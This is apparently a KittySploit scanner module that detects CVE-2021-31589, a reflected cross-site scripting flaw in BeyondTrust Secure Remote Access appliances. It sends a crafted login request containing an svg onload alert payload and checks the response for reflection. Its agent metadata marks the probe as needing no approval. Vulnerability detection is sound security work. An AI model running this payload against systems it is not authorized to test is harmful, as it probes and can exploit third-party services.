#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""BeyondTrust Secure Remote Access Base through 6."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'BeyondTrust Secure Remote Access Base <=6.0.1 - Cross-Site Scripting Detection',
        'description': 'BeyondTrust Secure Remote Access Base through 6.0.1 contains a cross-site scripting vulnerability which allows remote attackers to inject arbitrary web script or HTML.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'xss', 'packetstorm', 'beyondtrust', 'bomgar', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/165408',
            'https://cxsecurity.com/issue/WLB-2022010013',
            'https://beyondtrustcorp.service-now.com/csm?sys_kb_id=922d0ab31bc1b490e73854ae034bcb7b&id=kb_article_view&sysparm_rank=1&sysparm_tsqueryId=64fc14ffdb8f70d422725385ca9619cb',
            'https://www.beyondtrust.com/docs/release-notes/index.htm',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-31589',
        ],
        'cve': 'CVE-2021-31589',
    }

    def run(self):
        r = self.http_request(method="GET", path='/appliance/login.ns?login%5Bpassword%5D=test%22%3E%3Csvg/onload=alert(document.domain)%3E&login%5Buse_curr%5D=1&login%5Bsubmit%5D=Change%20Password', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = (r.text or "").lower()
        body_all = ('<svg/onload=alert(document.domain)>', 'bomgar',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="BeyondTrust Secure Remote Access Base <=6.0.1 - Cross-Site Scripting detected",
                path='/appliance/login.ns?login%5Bpassword%5D=test%22%3E%3Csvg/onload=alert(document.domain)%3E&login%5Buse_curr%5D=1&login%5Bsubmit%5D=Change%20Password',
            )
            return True
        return False

